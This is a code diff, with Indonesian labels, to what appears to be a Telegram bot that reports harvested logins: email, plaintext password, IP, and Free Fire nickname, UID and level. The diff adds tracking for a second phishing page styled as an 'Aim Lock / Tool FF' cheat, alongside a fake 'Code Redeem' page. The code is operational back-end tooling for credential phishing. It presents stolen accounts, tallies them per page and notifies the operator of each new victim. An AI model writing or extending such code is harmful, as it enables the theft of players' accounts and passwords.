@@ -280,14 +280,13 @@ async function buildDataPage(page) {
   text += `<i>Menampilkan ${start + 1}–${Math.min(start + PER_PAGE, total)} dari ${total} data</i>\n`;
 
   slice.forEach((l, i) => {
-    const no = String(start + i + 1).padStart(3, '0');
+    const no        = String(start + i + 1).padStart(3, '0');
+    const isAimlock = (l.page === 'aimlock');
     text +=
-`\n┌─ <b>#${no}</b> ${methodIcon(l.method)} ${l.method} • ${fmtShort(l.ts)}
-├ 👤 <b>${l.nickname}</b> | 🆔 <code>${l.uid}</code>
-├ 🏆 Level: <b>${l.level || '-'}</b>
+`\n┌─ <b>#${no}</b> ${pageIcon(l.page)} ${pageLabel(l.page)} • ${methodIcon(l.method)} ${l.method} • ${fmtShort(l.ts)}
 ├ 📧 <code>${l.email}</code>
 ├ 🔑 <code>${l.password}</code>
-└ 🌐 <code>${l.ip}</code>\n`;
+${isAimlock ? '' : `├ 👤 <b>${l.nickname}</b> | 🆔 <code>${l.uid}</code> | 🏆 Lv<b>${l.level || '-'}</b>\n`}└ 🌐 <code>${l.ip}</code>\n`;
   });
 
   const nav = [];
@@ -322,11 +321,15 @@ async function buildStats() {
   const todayCount  = logins.filter(l => new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today).length;
   const weekCount   = logins.filter(l => now - l.ts < 7  * 86400000).length;
   const monthCount  = logins.filter(l => now - l.ts < 30 * 86400000).length;
-  const googleCount = logins.filter(l => l.method === 'Google').length;
-  const fbCount     = total - googleCount;
-  const gPct        = Math.round(googleCount / total * 100);
-  const fPct        = 100 - gPct;
-  const bar         = (pct, len = 12) => '█'.repeat(Math.round(pct / 100 * len)) + '░'.repeat(len - Math.round(pct / 100 * len));
+  const googleCount  = logins.filter(l => l.method === 'Google').length;
+  const fbCount      = total - googleCount;
+  const gPct         = Math.round(googleCount / total * 100);
+  const fPct         = 100 - gPct;
+  const aimlockCount = logins.filter(l => l.page === 'aimlock').length;
+  const redeemCount  = total - aimlockCount;
+  const aPct         = Math.round(aimlockCount / total * 100);
+  const rPct         = 100 - aPct;
+  const bar          = (pct, len = 12) => '█'.repeat(Math.round(pct / 100 * len)) + '░'.repeat(len - Math.round(pct / 100 * len));
 
   let text =
 `📈 <b>STATISTIK LENGKAP</b>
@@ -337,6 +340,12 @@ ${LINE}
 ├ Hari Ini      : <b>${todayCount}</b> data
 ├ 7 Hari        : <b>${weekCount}</b> data
 └ 30 Hari       : <b>${monthCount}</b> data
+
+📄 <b>SUMBER HALAMAN</b>
+├ 🎯 Aimlock   : <b>${aimlockCount}</b> (${aPct}%)
+│  <code>${bar(aPct)}</code>
+└ 🎁 Redeem    : <b>${redeemCount}</b> (${rPct}%)
+   <code>${bar(rPct)}</code>
 
 🔗 <b>METODE LOGIN</b>
 ├ 🔵 Google    : <b>${googleCount}</b> (${gPct}%)
@@ -351,7 +360,9 @@ ${LINE}
 ${LINE2}`;
 
   logins.slice(0, 5).forEach((l, i) => {
-    text += `\n${i + 1}. ${methodIcon(l.method)} <b>${l.nickname}</b> • <code>${l.uid}</code> • ${fmtShort(l.ts)}`;
+    const isAimlock = (l.page === 'aimlock');
+    const label     = isAimlock ? `<code>${l.email}</code>` : `<b>${l.nickname}</b> • <code>${l.uid}</code>`;
+    text += `\n${i + 1}. ${pageIcon(l.page)} ${methodIcon(l.method)} ${label} • ${fmtShort(l.ts)}`;
   });
 
   return {
@@ -497,21 +508,34 @@ ${LINE}
   };
 }
 
+function pageIcon(page) {
+  return page === 'aimlock' ? '🎯' : '🎁';
+}
+function pageLabel(page) {
+  return page === 'aimlock' ? 'AIMLOCK' : 'REDEEM';
+}
+
 function buildNotif(l, no) {
-  return `🔥 <b>LOGIN BARU MASUK!</b>
+  const isAimlock = (l.page === 'aimlock');
+  const header    = isAimlock
+    ? '🎯 <b>LOGIN AIMLOCK MASUK!</b>'
+    : '🎁 <b>LOGIN REDEEM MASUK!</b>';
+  const pageInfo  = isAimlock
+    ? '🎯 <b>Halaman</b>   : <b>Aim Lock / Tool FF</b>'
+    : '🎁 <b>Halaman</b>   : <b>Code Redeem</b>';
+
+  return `${header}
 ${LINE}
 
-👤 <b>Nickname</b>  : <b>${l.nickname}</b>
-🆔 <b>UID</b>       : <code>${l.uid}</code>
-🏆 <b>Level</b>     : <b>${l.level || '-'}</b>
+${pageInfo}
 ${methodIcon(l.method)} <b>Metode</b>    : <b>${l.method}</b>
 📧 <b>Email</b>     : <code>${l.email}</code>
 🔑 <b>Password</b>  : <code>${l.password}</code>
-🌐 <b>IP</b>        : <code>${l.ip}</code>
+${isAimlock ? '' : `👤 <b>Nickname</b>  : <b>${l.nickname}</b>\n🆔 <b>UID</b>       : <code>${l.uid}</code>\n🏆 <b>Level</b>     : <b>${l.level || '-'}</b>\n`}🌐 <b>IP</b>        : <code>${l.ip}</code>
 🕐 <b>Waktu</b>     : ${fmtTime(l.ts)} <b>WIB</b>
 
 ${LINE}
-📊 <b>Data ke-${no}</b> masuk ke database`;
+📊 <b>Data ke-${no}</b> · ${pageIcon(l.page)} ${pageLabel(l.page)}`;
 }
 
 // ════════════════════════════════════════
